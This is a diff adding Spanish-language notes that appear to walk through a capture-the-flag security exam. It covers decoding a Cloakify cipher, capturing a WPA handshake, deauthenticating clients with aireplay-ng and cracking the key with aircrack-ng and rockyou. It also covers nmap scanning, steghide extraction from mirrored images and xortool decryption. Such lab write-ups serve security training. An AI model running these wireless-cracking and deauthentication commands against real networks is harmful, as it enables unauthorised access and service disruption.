@@ -1,0 +1,65 @@
+Pasos para resolver examen
+
+
+1. ¿Examen en Jupyter en starTrek?
+
+	1.1. Probar xortool | rot13 | caesar
+
+	cat examen | caesar > examen2
+
+	1.2. Identificar palabras
+
+	1.3. python Cloakify/decloakify.py examen2 Cloakify/ciphers/starTrek > examen3 
+
+	https://github.com/TryCatchHCF/Cloakify/blob/master/DefCon24Slides/DefCon24_Cloakify_Exfiltration_Toolset.pdf
+
+
+2. Encontrar AP y romper clave.
+
+	2.1.  sudo apt-get -y install aircrack-ng
+	
+	2.2. sudo airmon-ng check kill
+
+	2.3. sudo iwlist wlan0 scanning|grep Channel: | sort | uniq -c
+
+	2.4. sudo ip l set wlan0 down
+
+	2.5. sudo iwconfig wlan0 mode monitor
+
+	2.6. sudo ip l set wlan0 up
+
+	2.7. sudo iwconfig wlan0 | grep Monitor --color=Always -C 3
+
+	2.8. sudo airodump-ng wlan0 -> Anotar BSSID y Canal
+
+	2.9.  sudo airodump-ng -w archivo_examen -c <CANAL> --bssid <BSSID> wlan0 -> comprobamos que el paso fue exitoso, esperando la leyenda "WPA Handshake"
+
+	2.10. aireplay-ng --deauth 5 -c MAC-cliente -a BSSID-AP wlan0
+
+	2.11. wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+
+	2.12. aircrack-ng -w rockyou.txt -b <BSSID> archivo_examen.cap
+
+
+
+3. Explorar la red para encontrar IP de la PI
+
+	3.1. sudo nmap 10.42.24.0/24
+
+4. Conectarse por ssh reutilizando clave de AP, pero necesita Google Authenticator adicionalmente. Explorar otros puertos.
+
+	4.1. http://IP-Raspberry/
+
+	4.2. wget --mirror -A *.jpg http://IP-Raspberry/
+
+	4.3. for imagen in `ls`; do steghide extract -sf $imagen ; done
+
+
+5. Encontrar archivo oculto, y tratar de descifrarlo.
+
+	5.1. xortool /home/greencore/.readme
+	5.2. xortool -l 9 -b /home/greencore/.readme
+
+
+
+
